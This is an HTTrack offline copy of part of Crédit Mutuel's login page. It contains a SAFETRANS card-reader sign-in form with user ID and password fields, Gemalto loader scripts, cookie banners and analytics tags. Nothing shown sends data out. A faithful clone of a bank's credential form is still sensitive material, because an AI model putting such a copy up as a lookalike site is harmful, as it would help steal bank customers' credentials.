                            <a href="identification/se-connecter-avec-un-certificat.html" class="ctx">Aide à la connexion</a>
                            <a href="#" onClick="return redirectToLink(infoSecurityUrl);" class="ctx">Infos sécurité</a>
                        </p>
                    </div>
                    <div id="safetrans" style="display:none">
                        
                        <div><script type="text/javascript">
    function loadScriptsSafetrans() {
        loadSafetransScript('../cdnsi.e-i.com/SDUT/sd/gemalto_ezio_web_connector/382.2910.7/js/sconnect_uc.min.js');
        loadSafetransScript('../cdnsi.e-i.com/SDUT/sd/gemalto_ezio_web_connector/382.2910.7/js/pcsc_uc.min.js');
        loadSafetransScript('../cdnsi.e-i.com/SDUT/sd/gemalto_ezio_web_connector/382.2910.7/js/logging.min.js');
        loadSafetransScript('../cdnsi.e-i.com/SDUT/sd/gemalto_ezio_web_connector/382.2910.7/js/enex.min.js');
        loadSafetransScript('../cdnsi.e-i.com/SDUT/sd/secure_channel/1.2.0/js/secure_channel.min.js', initializeSafetransScript);
    }

    function loadSafetransScript(url, callback) {
        var s = document.createElement('script');
        s.type = 'text/javascript';
        s.async = false;
        s.src = url;
        if (typeof callback === 'function') {
            s.onload = callback;
        }
        var x = document.getElementsByTagName('head')[0];
        x.appendChild(s);
    }

    function initializeSafetransScript() {
        // Initialize variable from secure_channel script
        _serverCertificateSerialNumber = "_359B34C5B24B3720D8EF7CAF";
        _gemaltoEzioWebConnectorCdnPath = "https://cdnsi.e-i.com/SDUT/sd/gemalto_ezio_web_connector/382.2910.7/";
    }

    var secureChannelIdentificationVerificator = null;

    function SecureChannelIdentificationVerificator() {
        this.styleVisible = document.getElementById("identification_form").style.display;
    }

    SecureChannelIdentificationVerificator.prototype.onReaderAvailable = function() {
        document.getElementById("identification_form").style.display = "none";
        document.getElementById("ejectCard").style.display="block";
    }

    SecureChannelIdentificationVerificator.prototype.onCardIn = function() {
        document.getElementById("identification_form").style.display = "none";
        document.getElementById("ejectCard").style.display="block";
    }

    SecureChannelIdentificationVerificator.prototype.onCardOut = function() {
        document.getElementById("identification_form").style.display=this.styleVisible;
        document.getElementById("ejectCard").style.display="none";
    }

    SecureChannelIdentificationVerificator.prototype.onReaderOut = function() {
        document.getElementById("identification_form").style.display=this.styleVisible;
        document.getElementById("ejectCard").style.display="none";
    }

    function SecureChannelIdentificationVerificatorLoad(id) {
        secureChannelIdentificationVerificator = new SecureChannelIdentificationVerificator();
        if (typeof(addApplication) == "function")
        {
            addApplication(secureChannelIdentificationVerificator, "SecureChannelIdentificationVerificator");
        }
        document.getElementById(id).focus();
    };

    window.onload = function() {
        SecureChannelIdentificationVerificatorLoad('_userid');
    }
</script>




<div class="ei_appl_ident" id="ident_safetrans" style="margin: 0px !important">
    
    <div id="ejectCard" style="display:none;" class="blocmsg info"><p>Veuillez retirer votre carte du lecteur</p></div>
    <div id="identification_form">
    
    
    <br />
    <form action="#safetrans" method="post" autocomplete="off" onsubmit="return submitFormSafetrans()" name="bloc_ident_safetrans">
        <fieldset>
            <div class="ei_appl_ident_content">
                <div class="ei_appl_ident_lig">
                    <label for="_userid">Identifiant</label>
                    <input type="text" name="_cm_user" id="_userid" class="ei_appl_userid" value=""/>
                </div>
                <div class="ei_appl_ident_lig">
                    <label for="_pwduser">Mot de passe</label>
                    <input type="password" name="_cm_pwd" id="_pwduser" class="ei_appl_pwduser"/>
                    <input type="hidden" name="flag" value="safetrans"/>
                </div>
                <script type="text/javascript">
                    document.forms["bloc_ident_safetrans"]._userid.focus();
                    var formSubmitted = false;
                    function submitFormSafetrans() {
                        if (formSubmitted) {
                            return false;
                        } else {
                            formSubmitted = true;
                            return true;
                        }
                    }
                </script>
            </div>
        </fieldset>
        <div class="ei_appl_ident_blocbts">
            <input type="image" onclick="esd1_displayWait('ident_safetrans', 'Chargement en cours', 'Veuillez patienter');" alt="Se connecter" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/seconnecter.png" name="submit">
        </div>
    </form>
    </div>
</div>

<!-- Hub Transferts - SConnect installation message lightbox -->
<div id="idLightBox">
    <div class="ei_blocmodal" role="dialog" aria-describedby="idTitle">
        <div class="a_blocfctltitre">
            <p class="a_options">
                <a class="btnclose" href="#" onclick="CloseLightBox('idLightBox')" id="btnclose"> <img alt="Fermer" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/btfermerpopup.png" /></a>
            </p>
            <p class="a_titre2" id="idTitle">Extension SConnect</p>
        </div>
        <div class="a_blocfctl" id="idContent" aria-describedby="idlibelle">
            <div id="idlibelle">
                <div>L'extension SConnect n'est pas installée sur votre poste.<br /><br />Pour pouvoir utiliser votre lecteur SAFETRANS avec l'application Hub Transferts, veuillez d'abord procéder à l'installation de l'extension SConnect depuis votre navigateur Internet Explorer (ou Safari pour les utilisateurs Mac OS).</div>
            </div>
            <div class="blocboutons">
                <br />
                <a href="#" onclick="CloseLightBox('idLightBox')" id="btnok"> <img alt="OK" src="../cdnsi.e-i.com/INGR/sd/cm_2015/25.92.9/fr/images/std/ok.gif"> </a>
            </div>
        </div>
        <span onfocus="$('#btnclose').focus();" role="presentation">&nbsp;</span>
    </div>
</div>
</div>
                        <p class="liensctx c">
                            <a href="#" onClick="return redirectToLink(forgotAccessUrl);" class="ei_acces">Codes d'accès oubliés</a>
                            <a href="identification/se-connecter-avec-un-lecteur-safetrans.html" class="ctx">Aide et diagnostic</a>
                            <a href="#" onClick="return redirectToLink(infoSecurityUrl);" class="ctx">Infos sécurité</a>
                        </p>
                    </div>
                    <div id="exceptionalBreak" style="display:none"></div>
                </div>
            </div>
            <div class="ei_md_endseparator"></div>
        </div>
    </div>
</div>


        </main>
    </div>

    <div id="ei_tpl_footer" role="contentinfo">
        <footer>
            <nav>
                
<div class="cc-legal-general ei_tpl_footer_legal">
	<p><span><em>Le Crédit&nbsp;Mutuel, banque coopérative, appartient à ses 8,1&nbsp;millions de clients-sociétaires.</em></span></p>
	<p>Caisse Fédérale de Crédit&nbsp;Mutuel et caisses affiliées, société coopérative à forme de société anonyme au capital de 5 458 531 008&nbsp;&euro;, 4 rue Frédéric-Guillaume Raiffeisen, 67000 Strasbourg, <abbr title="Registre du Commerce et des Sociétés">RCS</abbr> Strasbourg B&nbsp;588&nbsp;505&nbsp;354. Banques régies par les articles L.511-1 et suivants du code monétaire et financier. Pour les opérations effectuées en qualité d’intermédiaires en opérations d’assurances inscrits au registre national sous le numéro unique d’identification 07&nbsp;003&nbsp;758 (immatriculations consultables sous <a href="http://www.orias.fr/" target="_blank" title="Nouvelle fenêtre">www.orias.fr</a>), contrats d’assurances de <abbr>ACM</abbr> VIE <span title="Société Anonyme">SA</span> et <abbr>ACM</abbr> <abbr title="incendie, accidents et risques divers">IARD</abbr> <abbr>SA</abbr>, entreprises régies par le code des assurances et <abbr>MTRL</abbr>, Mutuelle Nationale relevant du Livre&nbsp;II du code de la mutualité.</p>
<p>&nbsp;</p></div>

                <div id="ei_tpl_footerlinks"><script type="text/javascript">
$( document ).ready(function() {
    $("#ei_tpl_menuPrincipal .e_select").parents('li').addClass("e_select");
})
</script>
<div class="ei_footer_wrapper">
	<ul>
		<li><a href="mentions-legales.html">Mentions légales</a></li>
          <li><a class="lightbox" href="#frmGeolocWrapper" data-cible="17" data-lightbox-title="Guides et informations réglementaires">Guides et informations réglementaires</a></li>
          <li><a href="http://www.creditmutuel.com/">Site institutionnel</a></li>
          <li><a class="lightbox" href="#frmGeolocWrapper" data-cible="14" data-lightbox-title="Trouver une caisse ou un distributeur">Trouver une caisse ou un distributeur</a></li>
          <li><a href="gestion-des-cookies.html">Gestion des cookies</a></li>
		  <li><a href="protection-donnees-personnelles-engagement.html">Protection des données</a></li>
          <li><a href="accessibilite/aide-et-accessibilite.html">Accessibilité : non conforme</a></li>
	</ul>
	<a title="Retour haut de page" id="ei_tpl_hpage" href="#ei_tpl_fullsite">Haut de page</a>
</div>
</div>
            </nav>
        </footer>
    </div>
</div>


<head></head>


<div class="ei_cookie" id="ei_cookie" style="display:none;">
	<div class="ei_cookie__wrapper">
		<p>
			En poursuivant votre navigation sur notre site, vous acceptez l'utilisation de cookies pour s&eacute;curiser votre connexion, faciliter votre navigation, vous proposer des offres adapt&eacute;es et permettre l'&eacute;laboration de statistiques. Informations cookies et param&eacute;trage, <a title="Page de pr&eacute;sentation des cookies" target="_blank" href="gestion-des-cookies.html">cliquez ici.</a>
		</p>
		<div class="ei_cookie__blocboutons">
			<button title="Accepter l'utilisation des cookies" class="allow" type="button" onclick="acceptallcookies(pathCookie);location.reload();">OK</button>
			<!-- <button title="Personnaliser" type="button" onclick="openPanel()">Personnaliser </button> document.getElementById('ei_cookie').style.display = 'none'; -->
		</div>
	</div>
</div>
<div class="ei_cookie ei_cookie--perso" id="ei_cookie_perso" style="display:none;">
	<div class="ei_cookie__wrapper">
		<p>Personnalisation des cookies</p>
		<p>
			<span class="ei_cookie__label">Cookies d'audience</span>
			<button id="AllowAudience" class="allow" title="Audience" type="button" onclick="acceptCookieCategory('cookie_audience', pathCookie);this.className='allow choix';document.getElementById('DenyAudience').className='deny';">Autoriser</button>
			<button id="DenyAudience" class="deny" title="Audience" type="button" onclick="denyCookieCategory('cookie_audience', pathCookie);this.className='deny choix';document.getElementById('AllowAudience').className='allow';">Interdire</button>
		</p>
		<p>
			<span class="ei_cookie__label">Cookies marketing</span>
			<button id="AllowMarketing" class="allow" title="Marketing" type="button" onclick="acceptCookieCategory('cookie_marketing', pathCookie);this.className='allow choix';document.getElementById('DenyMarketing').className='deny';">Autoriser</button>
			<button id="DenyMarketing" class="deny" title="Marketing" type="button" onclick="denyCookieCategory('cookie_marketing', pathCookie);this.className='deny choix';document.getElementById('AllowMarketing').className='allow';">Interdire</button>
		</p>
		<p>
			<span class="ei_cookie__label">Cookies r&eacute;seaux sociaux</span>
			<button id="AllowReseaux" class="allow" title="Reseaux" type="button" onclick="acceptCookieCategory('cookie_reseaux', pathCookie);this.className='allow choix';document.getElementById('DenyReseaux').className='deny';">Autoriser</button>
			<button id="DenyReseaux" class="deny" title="Reseaux" type="button" onclick="denyCookieCategory('cookie_reseaux', pathCookie);this.className='deny choix';document.getElementById('AllowReseaux').className='allow';">Interdire</button>
		</p>
		<button title="Valider" type="button" onclick="closeCategory();location.reload();">Fermer</button>
	</div>
</div>
<script type="text/javascript" src="../cdnsi.e-i.com/SITW/sd/tools/2.0.12/javascripts/SITW-tools.js"></script>
<script type="text/javascript">
	document.body.onload = '';
	var pathCookie = "index.html";
	var cookiePolicyLink = 'gestion-des-cookies.html';
	jQuery(document).ready(function(){
		if(jQuery('.id_menu_immo').length!=0 && !getCommonInfo('eiol'))
			setCommonInfo('eiol',1);
		onLoadBodyCustom(['/gestion-des-cookies.html'], pathCookie);
	});
</script>

<!-- Fin code bandeau cookie CNIL V2-->

<!-- Web Analytics -->
<script>
if (typeof(page_name) == 'undefined') var page_name = "";
if (typeof(espacewat) == 'undefined') var espacewat = "";
if (typeof(env_template) == 'undefined' || env_template == "") var env_template = 'page';
var clientidentifie = 'false';
var clientreconnu = 'N';
var user_statut = '';
if (clientidentifie == "false" && clientreconnu == "N"){
	user_statut = "prospect";
	}
else if (clientidentifie == "false" && clientreconnu == "Y") {
	user_statut = "client reconnu";
	}
else if (clientidentifie == "true") {
	user_statut = "client authentifie";
};
if (typeof(dataLayer) == 'undefined') var dataLayer = [{
	'espace' : espacewat,
	'federation' : '',
	'caisse' : '',
	'contratbad' : '',
	'typeclient' : '',
	'clientidentifie' : clientidentifie,
	'clientreconnu' : clientreconnu,
	'alias' : '',
	'typomarche' : '',
	'activitebad' : '',
	'surfacefinanciere' : '',
	'langue' : 'fr',
	'enviro' : 'PRD',
	'canal' : 'WEB_DESKTOP',
	'sousespaces' : 'Aucun',
	'typepage' : env_template,
	'espaceclientreconnu' : '',
	'page_name' : page_name,
	'offre' : '',
	'statutclient' : user_statut,
	'usernivauto' : '',
	'usersubst' : '',
	'usernivacc' : ''
 }];
</script>

<!-- Google Tag Manager -->
<noscript><iframe src="http://www.googletagmanager.com/ns.html?id=GTM-K8HLMBP"
title="Google Tag Manager" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-K8HLMBP');</script>
<!-- End Google Tag Manager -->



<script type='text/javascript'>
var tags = ['GTM'];
</script>

<!-- fin Web Analytics -->


<!-- Datasinks V2 -->
<script type="text/javascript">
    if (typeof ds === "function") {
        var ds_data = {};
        if (typeof watData !== "undefined") {
            var mapping = ["espace","env_langue","env_espace","typepage","statutuser","substitution_mode","product_code_promo","page_cat1","page_cat2","page_cat3","page_cat4","page_cat5", "application_path"];
            for (var key in mapping) {
                var wat_key = mapping[key];
                if (watData.hasOwnProperty(wat_key)) {
                    ds_data[wat_key] = watData[wat_key];
                }
            }
        }
        var extend = function(out) {
    out = out || {};
    for (var i = 1; i < arguments.length; i++) {
        if (!arguments[i])
            continue;
        for (var key in arguments[i]) {
            if (arguments[i].hasOwnProperty(key))
                out[key] = arguments[i][key];
        }
    }
    return out;
};

page_info = { page_current_url: document.location.href.split('?')[0], page_source_url: document.referrer.split('?')[0], page_path: document.location.pathname, page_title: document.title }; ds_data = extend(page_info, ds_data);
        ds()("record", "page_viewed", ds_data);
    }
</script>
<!-- Datasinks V2 -->


</body>

<!-- Mirrored from www.creditmutuel.fr/authentification.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Sep 2021 17:29:33 GMT -->
</html>